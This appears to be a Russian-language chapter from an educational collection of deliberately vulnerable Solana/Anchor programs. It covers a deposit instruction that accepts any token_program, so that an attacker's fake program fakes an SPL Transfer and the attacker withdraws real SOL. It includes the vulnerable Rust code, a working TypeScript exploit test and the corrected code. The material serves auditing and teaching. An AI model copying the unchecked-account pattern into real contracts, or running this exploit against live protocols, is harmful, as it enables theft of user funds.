# 15 — Фейковая token-программа: фантомный депозит и вывод реальных SOL

**Класс:** unchecked `token_program` — CPI в программу атакующего.
**Файлы:** `programs/vuln15_token_program/`, `tests/15_token_program.test.ts`,
эксплойт: режим 3 программы `native-programs/attacker`.
**Последствие:** атакующий «депонирует» токены, которых не существует
(CPI возвращает success, ничего не перемещая), и выводит реальные SOL.

## 1. Суть уязвимости

Гибридный протокол «внеси токены — выведи SOL» (модель однонаправленного
моста/шлюза). Инструкция депозита собирает SPL `Transfer` (opcode 3)
**вручную** и вызывает `invoke` с тем program id, который передал
пользователь:

1. `token_program` — `UncheckedAccount`: должен быть `Program<'info, Token>`,
   а вместо этого любой program id;
2. `user_ata` — тоже без проверок (owner/mint/owner-program);
3. сумма кредита берётся из аргумента инструкции и не сверяется с фактическим
   изменением балансов.

Атакующий передаёт **свою программу**: она получает привычный SPL-вызов
`Transfer` и молча возвращает `Ok(())` — «перевод прошёл». Протокол
засчитывает несуществующий депозит, после чего атакующий выводит SOL из
протокольного хранилища.

## 2. Уязвимый код

```rust
#[derive(Accounts)]
pub struct DepositTokens<'info> {
    /// CHECK: БАГ 1 — должно быть Program<'info, Token>;
    /// принимается ЛЮБОЙ program id.
    pub token_program: UncheckedAccount<'info>,
    /// CHECK: БАГ 2 — нет проверок owner/mint/owner-program.
    #[account(mut)]
    pub user_ata: UncheckedAccount<'info>,
    ...
}

pub fn deposit_tokens(ctx: Context<DepositTokens>, amount: u64) -> Result<()> {
    let mut ix_data = Vec::with_capacity(9);
    ix_data.push(3u8);                                   // SPL Transfer opcode
    ix_data.extend_from_slice(&amount.to_le_bytes());
    let ix = Instruction::new_with_bytes(*ctx.accounts.token_program.key, &ix_data, metas);
    invoke(&ix, &[user_ata, vault_ata, user])?;          // CPI куда угодно

    dep.amount += amount;                                 // кредит без сверки
    Ok(())
}
```

## 3. Как эксплуатируется

Тест `tests/15_token_program.test.ts` + режим 3 `attacker` («фейковая
token-программа»: opcode 3 → `Ok(())` без перемещения чего-либо):

1. У атакующего **0 токенов** (ATA пуст) — депозит будет чистой фикцией.
2. `depositTokens(5 SOL)` с `tokenProgram = программа атакующего`:
   CPI «успешен», протокол записывает `deposit.amount = 5 SOL`.
3. `withdrawSol(5 SOL)` — протокол переводит атакующему реальные SOL.

```ts
await program.methods.depositTokens(new BN(STEAL))
  .accounts({
    deposit,
    tokenProgram: PROG_IDS.attacker,   // CPI-цель — программа атакующего
    userAta: attackerAta,              // пустая, никогда не читается
    vaultAta: tokenVault, mint, solVault,
    user: attacker.publicKey,
  })
  .signers([attacker]).rpc();

// В токенах ничего не изменилось — депозит выдуман:
assert.equal((await tokenBalance(attackerAta)).toString(), "0");
// ...а SOL атакующий получил:
assert.isAtLeast((await solBalance(attacker.publicKey)) - attackerBefore, STEAL - 10_000);
```

## 4. Результат атаки (проверяется тестом)

- `deposit.amount` атакующего = 5 SOL при нуле реально переведённых токенов.
- Баланс атакующей ATA не изменился — «депозит» фантомный.
- Атакующий вывел 5 SOL из протокольного хранилища; `deposit.amount` обнулён.

## 5. Реальные кейсы

- Класс «token program / token account not validated» обострился с rollout
  **Token-2022**: программы, проверяющие owner-программу «строкой» или
  вовсе не проверяющие, принимали аккаунты чужой token-программы; правило
  «validate the token program id» — базовый пункт каждого аудита 2023–2024.
- Родственный инцидент-класс: подмена program id в CPI (см. 05 — Wormhole),
  здесь же достаточно передать «чужую» программу как token_program.

## 6. Исправление

```rust
// ДО (баг): любые program id и аккаунты
pub token_program: UncheckedAccount<'info>,
pub user_ata: UncheckedAccount<'info>,

// ПОСЛЕ: типизированная проверка на границе
pub token_program: Program<'info, Token>,
#[account(
    mut,
    constraint = user_ata.owner == user.key() @ GateError::WrongOwner,
    constraint = user_ata.mint == mint.key() @ GateError::WrongMint,
)]
pub user_ata: Account<'info, TokenAccount>,
```

Правила:

1. `token_program` — всегда `Program<'info, Token>` (или
   `Interface<'info, TokenInterface>` для Token-2022, с явным допуском).
2. После CPI сверяй балансы «до/после»: кредит = фактическому приросту
   vault, а не аргументу.
3. Строить SPL-инструкции через builder API — он валидирует program id.

## 7. Как запустить

```bash
SKIP_BUILD=1 ./scripts/run_tests.sh tests/15_token_program.test.ts
```
